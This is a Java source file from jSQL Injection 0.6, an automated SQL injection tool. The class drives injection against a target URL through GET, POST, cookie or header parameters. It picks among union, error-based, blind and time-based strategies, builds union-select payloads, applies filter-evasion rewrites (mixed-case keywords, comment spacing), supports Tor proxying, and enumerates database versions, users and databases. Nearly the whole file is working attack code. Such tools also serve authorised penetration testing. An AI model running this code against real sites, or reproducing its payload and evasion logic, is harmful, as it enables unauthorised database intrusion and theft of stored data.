/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.prefs.Preferences;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.ao.DataAccessObject;
import com.jsql.model.ao.RessourceAccessObject;
import com.jsql.model.bean.AbstractElementDatabase;
import com.jsql.model.bean.Request;
import com.jsql.model.pattern.strategy.AbstractInjectionStrategy;
import com.jsql.model.pattern.strategy.BlindStrategy;
import com.jsql.model.pattern.strategy.ErrorbasedStrategy;
import com.jsql.model.pattern.strategy.NormalStrategy;
import com.jsql.model.pattern.strategy.TimeStrategy;
import com.jsql.tool.StringTool;
import com.jsql.view.GUI;
import com.jsql.view.GUIMediator;

/**
 * Model in charge of injection.<br>
 * MVC functionalities are provided by ModelObservable.
 */
public class InjectionModel extends AbstractModelObservable {
    /**
     * List of running jobs.
     */
    public Map<AbstractElementDatabase, AbstractSuspendable> suspendables = new HashMap<AbstractElementDatabase, AbstractSuspendable>();
    
    /**
     * Current version of application.
     */
    public static final String JSQLVERSION = "0.6";

    /**
     * i.e, -1 in "[...].php?id=-1 union select[...]"
     */
    public String insertionCharacter;
    
    /**
     * HTML source of page successfully responding to
     * multiple fileds selection (select 1,2,3,...).
     */
    public String firstSuccessPageSource;
    
    /**
     * Url entered by user.
     */
    public String initialUrl;
    /**
     * i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source.
     */
    public String visibleIndex;
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    public String initialQuery;

    /**
     * GET, POST, COOKIE, HEADER (State/Strategy pattern).
     */
    public String method;
    
    /**
     * Get data submitted by user.
     */
    public String getData;
    
    /**
     * Post data submitted by user.
     */
    public String postData;
    
    /**
     * Cookie data submitted by user.
     */
    public String cookieData;
    
    /**
     * Header data submitted by user.
     */
    public String headerData;

    /**
     * Current version of database.
     */
    public String versionDatabase;
    
    /**
     * Selected database.
     */
    public String currentDatabase;
    
    /**
     * User connected to database.
     */
    public String currentUser;
    
    /**
     * User authenticated in database.
     */
    public String authenticatedUser;
    
    /**
     * Proxy address.
     */
    public String proxyAddress;
    
    /**
     * Proxy port.
     */
    public String proxyPort;
    
    /**
     * File path saved in preference.
     */
    public String prefPathFile;
    
    /**
     * True if connection is proxified.
     */
    public boolean isProxyfied = false;
    
    /**
     * Current injection strategy.
     */
    private AbstractInjectionStrategy injectionStrategy;
    
    /**
     * Get current injection strategy.
     */
    public AbstractInjectionStrategy getInjectionStrategy() {
        return injectionStrategy;
    }

    /**
     * Strategy for blind attack injection.
     */
    private BlindStrategy blindStrategy = new BlindStrategy();
    
    /**
     * Strategy for error attack injection.
     */
    private ErrorbasedStrategy errorbasedStrategy = new ErrorbasedStrategy();
    
    /**
     * Strategy for time attack injection.
     */
    private NormalStrategy normalStrategy = new NormalStrategy();
    
    /**
     * Strategy for time attack injection.
     */
    private TimeStrategy timeStrategy = new TimeStrategy();

    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    public boolean isInjectionBuilt = false;

    /**
     * Object to load file information.
     */
    public RessourceAccessObject rao = new RessourceAccessObject();
    
    /**
     * Object to load database information. 
     */
    public DataAccessObject dao = new DataAccessObject();
    
    /**
     * Current evasion step, 0 is 'no evasion'
     */
    public int securitySteps = 0;

    /**
     * Log4j logger sent to view.
     */
    public static final Logger LOGGER = Logger.getLogger(InjectionModel.class);

    /**
     * Create injection process.
     */
    public InjectionModel() {
        LOGGER.info("jSQL Injection version " + JSQLVERSION);

        String sVersion = System.getProperty("java.version");
        sVersion = sVersion.substring(0, 3);
        Float fVersion = Float.valueOf(sVersion);
        if (fVersion.floatValue() < (float) 1.7) {
            InjectionModel.LOGGER.warn("You are running an old version of Java, please install the latest version from java.com.");
        }

        // Use Preferences API to persist proxy configuration
        Preferences prefs = Preferences.userRoot().node(InjectionModel.class.getName());

        // Default proxy disabled
        this.isProxyfied = prefs.getBoolean("isProxyfied", false);

        // Default TOR config
        this.proxyAddress = prefs.get("proxyAddress", "127.0.0.1");
        this.proxyPort = prefs.get("proxyPort", "8118");
        
        this.prefPathFile = prefs.get("pathFile", System.getProperty("user.dir"));

        if (isProxyfied) {
            System.setProperty("http.proxyHost", proxyAddress);
            System.setProperty("http.proxyPort", proxyPort);
        }
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via stopFlag).
     * Erase all attributes eventually defined in a previous injection.
     */
    public void inputValidation() {
        insertionCharacter = null;
        visibleIndex = null;
        initialQuery = null;

        versionDatabase = null;
        currentDatabase = null;
        currentUser = null;
        authenticatedUser = null;
        
        stopFlag = false;
        isInjectionBuilt = false;
        
        this.injectionStrategy = null;
        
        rao.hasFileRight = false;

        try {
            // Test if proxy is available then apply settings
            if (isProxyfied && !proxyAddress.equals("") && !proxyPort.equals("")) {
                try {
                    InjectionModel.LOGGER.info("Testing proxy...");
                    new Socket(proxyAddress, Integer.parseInt(proxyPort)).close();
                } catch (Exception e) {
                    throw new PreparationException("Proxy connection failed: " + proxyAddress + ":" + proxyPort
                            + "\nVerify your proxy informations or disable proxy setting.");
                }
                InjectionModel.LOGGER.info("Proxy is responding.");
            }

            // Test the HTTP connection
            try {
                InjectionModel.LOGGER.info("Starting new injection");
                InjectionModel.LOGGER.info("Connection test...");

                URLConnection con = new URL(this.initialUrl).openConnection();
                con.setReadTimeout(15000);
                con.setConnectTimeout(15000);

                BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));
                reader.readLine();
                reader.close();
            } catch (IOException e) {
                throw new PreparationException("Connection problem: " + e.getMessage());
            }

            // Define insertionCharacter, i.e, -1 in "[...].php?id=-1 union select[...]",
            InjectionModel.LOGGER.info("Get insertion character...");
//            this.insertionCharacter = new StoppableGetInsertionCharacter().begin();
            this.insertionCharacter = new StoppableGetInsertionCharacter().beginSynchrone();

            // Test each injection methods: time, blind, error, normal
            timeStrategy.checkApplicability();
            blindStrategy.checkApplicability();
            errorbasedStrategy.checkApplicability();
            normalStrategy.checkApplicability();

            // Choose the most efficient method: normal > error > blind > time
            if (!this.normalStrategy.isApplicable()) {
                if (this.errorbasedStrategy.isApplicable()) {
                    errorbasedStrategy.applyStrategy();
                } else if (this.blindStrategy.isApplicable()) {
                    blindStrategy.applyStrategy();
                } else if (this.timeStrategy.isApplicable()) {
                    timeStrategy.applyStrategy();
                } else {
                    // No injection possible, increase evasion level and restart whole process
                    securitySteps++;
                    if (securitySteps <= 2) {
                        InjectionModel.LOGGER.warn("Injection not possible, testing evasion n�" + securitySteps + "...");
                        // sinon perte de insertionCharacter entre 2 injections
                        getData += insertionCharacter;
                        inputValidation();
                        return;
                    } else {
                        throw new PreparationException("Injection not possible, work stopped");
                    }
                }
            } else {
                normalStrategy.applyStrategy();

                try {
                    // Define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
                    this.visibleIndex = this.getVisibleIndex(this.firstSuccessPageSource);
                } catch (ArrayIndexOutOfBoundsException e) {
                    // Rare situation where injection fails after being validated, try with some evasion
                    securitySteps++;
                    if (securitySteps <= 2) {
                        InjectionModel.LOGGER.warn("Injection not possible, testing evasion n�" + securitySteps + "...");
                        // sinon perte de insertionCharacter entre 2 injections
                        getData += insertionCharacter;
                        inputValidation();
                        return;
                    } else {
                        throw new PreparationException("Injection not possible, work stopped");
                    }
                }
            }

            // Get the initial informations from database
            dao.getDBInfos();

            // Stop injection if database is too old
            if (versionDatabase.charAt(0) == '4' || versionDatabase.charAt(0) == '3') {
                throw new PreparationException("Old database, automatic search is not possible");
            }

            // Get the databases
            dao.listDatabases();
            
            InjectionModel.LOGGER.info("Done.");
            isInjectionBuilt = true;
        } catch (PreparationException e) {
            InjectionModel.LOGGER.warn(e.getMessage());
        } catch (StoppableException e) {
            InjectionModel.LOGGER.warn(e.getMessage());
        } finally {
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.interact(request);
        }
    }

    /**
     * Runnable class, search the most efficient index.<br>
     * Some indexes will display a lots of characters, others won't,
     * so sort them by order of efficiency:<br>
     * find the one that display the most of characters.
     * @return Integer index with most efficiency and visible in source code
     */
    private String getVisibleIndex(String firstSuccessPageSource) {
        // Parse all indexes found
        Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
        ArrayList<String> foundIndexes = new ArrayList<String>();
        while (regexSearch.find()) {
            foundIndexes.add(regexSearch.group(1));
        }

        String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);

        // Make url shorter, replace useless indexes from 1337[index]7331 to 1
        this.initialQuery = this.initialQuery.replaceAll("1337(?!" + StringTool.join(indexes, "|") + "7331)\\d*7331", "1");
        if (indexes.length == 1) {
            return indexes[0];
        }

        // Replace correct indexes from 1337[index]7331 to
        //     (select concat('SQLi',[index],repeat('#',1024),'iLQS'))
        // ==> SQLi[index]######...######iLQS
        // Search for index that displays the most #
        String performanceQuery =
                this.initialQuery.replaceAll(
                    "1337(" + StringTool.join(indexes, "|") + ")7331",
                    "(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"
                );

        String performanceSourcePage = this.inject(performanceQuery);

        // Build a 2D array of string with:
        //     column 1: index
        //     column 2: # found, so #######...#######
        regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
        ArrayList<String[]> performanceResults = new ArrayList<String[]>();
        while (regexSearch.find()) {
            performanceResults.add(new String[]{regexSearch.group(1), regexSearch.group(2)});
        }

        // Switch from previous array to 2D integer array
        //     column 1: length of #######...#######
        //     column 2: index
        Integer[][] lengthFields = new Integer[performanceResults.size()][2];
        for (int i = 0; i < performanceResults.size(); i++) {
            lengthFields[i] = new Integer[]{
                performanceResults.get(i)[1].length(),
                Integer.parseInt(performanceResults.get(i)[0])
            };
        }

        // Sort by length of #######...#######
        Arrays.sort(lengthFields, new Comparator<Integer[]>() {
            @Override
            public int compare(Integer[] s1, Integer[] s2) {
                Integer t1 = s1[0];
                Integer t2 = s2[1];
                return t1.compareTo(t2);
            }
        });

        // Replace all others indexes by 1
        this.initialQuery =
                this.initialQuery.replaceAll(
                    "1337(?!" + lengthFields[lengthFields.length - 1][1] + "7331)\\d*7331",
                    "1"
                );
        return Integer.toString(lengthFields[lengthFields.length - 1][1]);
    }

    /**
     * Used to inject without need of index (select 1,2,...).<br>
     * -> first index test (getVisibleIndex), errorbased test,
     * and errorbased, blind, timed injection.
     * @return source code of current page
     */
    public String inject(String dataInjection) {
        return this.inject(dataInjection, null, false);
    }

    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    public String inject(String dataInjection, String[] responseHeader,
            boolean useVisibleIndex) {
        HttpURLConnection connection = null;
        URL urlObject = null;

        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlUltimate = this.initialUrl;
        // escape crazy characters, like \
        dataInjection = dataInjection.replace("\\", "\\\\");

        try {
            urlObject = new URL(urlUltimate);
        } catch (MalformedURLException e) {
            InjectionModel.LOGGER.warn("Malformed URL " + e.getMessage());
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         */
        if (this.getData != null && !this.getData.equals("")) {
            urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
            try {
                /*
                 * Evasion
                 */
                switch (securitySteps) {
                    /*
                     * Case evasion
                     */
                    case 1:
                        urlUltimate = urlUltimate
                            .replaceAll("union\\+", "uNiOn+")
                            .replaceAll("select\\+", "sElEcT+")
                            .replaceAll("from\\+", "FrOm+")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe+")
                            .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    break;
                    /**
                     * Case + Space evasion
                     */
                    case 2:
                        urlUltimate = urlUltimate
                            .replaceAll("union\\+", "uNiOn/**/")
                            .replaceAll("select\\+", "sElEcT/**/")
                            .replaceAll("from\\+", "FrOm/**/")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe/**/")
                            .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                        urlUltimate = urlUltimate.replaceAll("--\\+", "--")
                            .replaceAll("\\+", "/**/");
                    break;
                    default:
                        break;
                }
                //                System.out.println(new Date() + " " + urlUltimate);
                urlObject = new URL(urlUltimate);
            } catch (MalformedURLException e) {
                InjectionModel.LOGGER.warn("Malformed URL " + e.getMessage());
            }
        }

        // Define the connection
        try {
            connection = (HttpURLConnection) urlObject.openConnection();
            connection.setReadTimeout(15000);
            connection.setConnectTimeout(15000);
        } catch (IOException e) {
            InjectionModel.LOGGER.warn("Error during connection: " + e.getMessage());
        }

        Map<String, Object> msgHeader = new HashMap<String, Object>();
        msgHeader.put("Url", urlUltimate);
        
        /**
         * Build the COOKIE and logs infos
         * #Need primary evasion
         */
        if (!this.cookieData.equals("")) {
            connection.addRequestProperty("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
            
            msgHeader.put("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
        }

        /**
         * Build the HEADER and logs infos
         * #Need primary evasion
         */
        if (!this.headerData.equals("")) {
            for (String s: this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection).split(";")) {
                try {
                    connection.addRequestProperty(s.split(":", 2)[0], URLDecoder.decode(s.split(":", 2)[1], "UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    InjectionModel.LOGGER.warn("Unsupported header encoding " + e.getMessage());
                }
            }
            
            msgHeader.put("Header", this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection));
        }

        /**
         * Build the POST and logs infos
         * #Need primary evasion
         */
        if (!this.postData.equals("")) {
            try {
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                dataOut.writeBytes(this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
                dataOut.flush();
                dataOut.close();
                
                msgHeader.put("Post", this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
            } catch (IOException e) {
                InjectionModel.LOGGER.warn(
                        "Error during POST connection " + e.getMessage());
            }
        }

        msgHeader.put("Response", StringTool.getHTTPHeaders(connection));

        // Inform the view about the log infos
        Request request = new Request();
        request.setMessage("MessageHeader");
        request.setParameters(msgHeader);
        this.interact(request);

        // Request the web page to the server
        String line, pageSource = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            while ((line = reader.readLine()) != null) {
                pageSource += line;
            }
            reader.close();
        } catch (MalformedURLException e) {
            InjectionModel.LOGGER.warn("Malformed URL " + e.getMessage());
        } catch (IOException e) {
            /* lot of timeout in local use */
            InjectionModel.LOGGER.warn("Read error " + e.getMessage());
        }

        // return the source code of the page
        return pageSource;
    }

    /**
     * Build a correct data for GET, POST, COOKIE, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param newData Beginning of the request data
     * @param useVisibleIndex False if request doesn't use indexes
     * @param urlPremiere SQL statement
     * @return Final data
     */
    private String buildQuery(String dataType, String newData, boolean useVisibleIndex, String urlPremiere) {
        if (!this.method.equalsIgnoreCase(dataType)) {
            return newData;
        } else if (!useVisibleIndex) {
            return newData + urlPremiere;
        } else {
            return newData
                    + this.initialQuery.replaceAll("1337" + visibleIndex + "7331",
                            "(" + urlPremiere + ")");
        }
    }

    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.info(message + ", response from site:");
        LOGGER.info(">>>" + source);
    }

    /**
     * Set injection strategy.
     * @param injectionStrategy Strategy for injection
     */
    public void applyStrategy(AbstractInjectionStrategy injectionStrategy) {
        this.injectionStrategy = injectionStrategy; 
    }

    /**
     * Set injection strategy.
     * @param text Strategy used by user
     */
    public void applyStrategy(String text) {
        if (text.equalsIgnoreCase("timebased")) {
            this.injectionStrategy = timeStrategy;
        } else if (text.equalsIgnoreCase("blind")) {
            this.injectionStrategy = blindStrategy;
        } else if (text.equalsIgnoreCase("errorbased")) {
            this.injectionStrategy = errorbasedStrategy;
        } else if (text.equalsIgnoreCase("normal")) {
            this.injectionStrategy = normalStrategy;
        }
    }
    
    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(String getData, String postData, String cookieData, String headerData, String method) {
        try {
            // Parse url and GET query string
            this.getData = "";
            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(getData);
            if (regexSearch.find()) {
                URL url = new URL(getData);
                this.initialUrl = regexSearch.group(1);
                if (!url.getQuery().equals("")) {
                    this.getData = regexSearch.group(2);
                }
            } else {
                this.initialUrl = getData;
            }
            
            // Define other methods
            this.postData = postData;
            this.cookieData = cookieData;
            this.headerData = headerData;
            this.method = method;
            
            // Reset level of evasion
            this.securitySteps = 0;
            
            // Start the model injection process in a thread
            new Thread(new Runnable() {
                @Override
                public void run() {
                    InjectionModel.this.inputValidation();
                }
            }, "InjectionController - controlInput").start();
            
            // Erase everything in the view from a previous injection
            GUIMediator.gui().resetInterface();
        } catch (MalformedURLException e) {
            InjectionModel.LOGGER.warn(e.getMessage());
        }
    }
    
    /**
     * Application starting point.
     * @param args CLI parameters (not used)
     */
    public static void main(String[] args) {
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                GUIMediator.register(new InjectionModel());
                GUIMediator.register(new GUI());
            }
        });
    }
}
